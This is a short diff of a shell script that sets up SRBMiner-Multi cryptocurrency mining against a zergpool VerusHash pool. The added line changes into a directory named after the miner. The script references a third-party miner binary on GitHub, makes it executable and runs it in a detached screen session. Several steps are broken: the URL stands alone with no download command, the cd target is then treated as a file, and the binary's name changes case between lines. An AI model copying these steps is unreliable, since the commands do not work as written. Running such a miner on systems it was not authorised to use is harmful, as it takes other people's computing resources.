@@ -3,6 +3,7 @@ sudo apt update
 sudo apt install screen -y
 sudo apt install screen libjansson4 -y
 https://github.com/fsinclai/vrsc-mine/raw/main/SRBMiner-MULTI
+cd SRBMiner-Multi
 chmod +x  SRBMiner-Multi
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
